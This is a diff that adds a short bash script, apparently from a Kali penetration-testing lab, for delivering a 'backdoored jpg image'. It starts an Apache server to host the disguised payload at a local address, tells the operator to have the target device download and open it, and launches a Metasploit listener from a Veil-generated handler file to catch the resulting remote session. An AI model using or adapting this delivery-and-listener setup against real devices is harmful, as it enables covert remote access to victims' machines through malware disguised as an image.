@@ -1,0 +1,9 @@
+#!/bin/bash
+echo "~~Script Description: This script is used test a backdoored jpg image. Once the listener is started, go to the target device and download the image from http://10.0.2.15/files/car.zip and open it to see that a asession will be opened on Kali listener."
+service apache2 start
+echo "Apache2 server started."
+msfconsole -q -r /var/lib/veil/output/handlers/car.rc
+
+
+
+
